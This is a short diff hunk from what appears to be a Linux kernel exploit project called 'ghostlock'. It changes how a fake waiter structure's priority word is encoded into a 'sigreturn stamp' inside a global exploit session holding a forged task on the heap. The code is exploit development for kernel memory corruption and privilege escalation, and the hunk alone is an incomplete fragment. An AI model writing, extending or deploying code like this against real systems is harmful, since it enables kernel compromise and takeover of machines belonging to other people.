@@ -446,7 +446,9 @@ namespace ghostlock::route::sigreturn {
                 static_cast<unsigned long long>(request->target));
         const memory::WaiterWords words = memory::waiter_words(
             stamp_layout, (session::g_exploit_session.heap.current.fake_task), lock,
-            static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO));
+            kernel::waiter_prio_word(
+                    kernel::FAKE_WAITER_PRIO,
+                    session::g_exploit_session.profile.compact_waiter_has_wake_state()));
         if (!memory::encode_waiter_words(strip, 0, words)) {
             pr_warning("sigreturn stamp does not fit its window (%zu bytes)\n", strip.size());
             return false;
